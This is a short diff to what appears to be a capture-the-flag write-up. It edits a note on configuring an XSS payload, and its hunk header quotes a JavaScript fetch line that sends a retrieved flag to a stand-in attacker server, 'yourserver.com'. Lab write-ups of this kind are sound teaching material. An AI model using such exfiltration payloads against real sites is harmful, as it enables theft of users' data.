@@ -99,4 +99,4 @@ fetch(`http://yourserver.com?flag=${await resp.text()}`)
 </script>
 ```
 
-note: replace `http://localhost:3000` with instance ip
+note: replace `http://localhost:3000` with instance ip, and `http://yourserver.com` with your webhook ip.
